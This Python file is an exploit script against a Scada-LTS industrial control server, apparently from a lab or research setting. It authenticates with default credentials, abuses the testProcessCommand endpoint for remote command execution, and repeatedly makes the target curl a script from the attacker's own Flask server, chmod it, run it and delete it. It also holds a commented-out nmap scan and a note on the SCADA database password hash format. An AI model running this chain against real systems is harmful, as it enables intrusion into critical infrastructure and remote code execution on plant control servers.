from flask import Flask
import requests
import urllib.parse
import nmap
import threading
import time
import socket
import fcntl
import struct

PORT = 8080
scada_url='http://10.0.0.21:8080'
scanner = nmap.PortScanner()

app = Flask(__name__)
#start_web_server = lambda: app.run(host='0.0.0.0', port=PORT)

@app.route('/get_script/<string:name>')
def get_script(name):
    if not name: return "error"

    with open('scripts/'+name, 'r') as f:
        return f.read()

@app.route('/test')
def test():
    print("TEST")
    return "Test"

def execute_cmd(cmd, scada_url, username, password):
    print("GET res sent")
    res = requests.get(scada_url+f'/ScadaLTS/api/auth/{username}/{password}')
    print("GET res obtained")
    jsession_cookie=res.headers['Set-Cookie']

    headers = {'Cookie': jsession_cookie,
    'Content-Type': 'text/plain'}

    cmd = urllib.parse.quote_plus(cmd)
    
    print("POST res sent")
    res = requests.post(scada_url+'/ScadaLTS/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr', 
    headers=headers,
    data=f"callCount=1&scriptSessionId=&c0-scriptName=EventHandlersDwr&c0-methodName=testProcessCommand&c0-param0={cmd}")
    print("POST res obtained")

def execute_script(scriptname, this_ip, username, password):
    global scada_url # temporary solution
    print('Executing script')

    for i in range(30):
        try:
            print(f"Tentativo {i}")
            #time.sleep(5)
            print("trying curl")
            execute_cmd(f"test:curl {this_ip}:{PORT}/get_script/{scriptname} -o /root/cmd", scada_url, username, password)
            print("trying chmod")
            execute_cmd("test:chmod 777 /root/cmd", scada_url, username, password)
            print("trying exec")
            execute_cmd("test:/root/cmd", scada_url, username, password)
            time.sleep(5)
            print("trying rm")
            execute_cmd("test:rm -f /root/cmd", scada_url, username, password)
            time.sleep(5)
        except Exception as e:
            print("error")
            print(e)

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ret = socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])
    s.close()

    return ret

if __name__ == "__main__":
    ip = get_ip_address('eth0')
    print('ip: '+ip)
    with open('scripts/fetch_and_send.sh', 'w') as f:
        f.write(f'#!/bin/sh\ncurl http://{ip}:{PORT}/test')

    ### WEBSERVER
    webserverThread = threading.Thread(target=app.run, args={'host':'0.0.0.0', 'port':PORT})
    webserverThread.start()

    ### RCE
    rceThread = threading.Thread(target=execute_script, args=('fetch_and_send.sh', ip, 'test', 'test'))
    rceThread.start()
    #execute_script('fetch_and_send.sh', ip, 'test', 'test')

    # SCAN
    '''
    scanner.scan('172.16.10.99-101')
    for host in scanner.all_hosts():
        print("\n\nHost: ", host)
        print("State: ", scanner[host].state())
        for proto in scanner[host].all_protocols():
            print("Protocol: ", proto)
            ports = scanner[host][proto].keys()
            for port in ports:
                print("Port: ", port, "State: ", scanner[host][proto][port]['state'])
                '''
    
    # Possible Hash per password Scada DB
    # Base64(unhex(SHA-1($plaintext)))
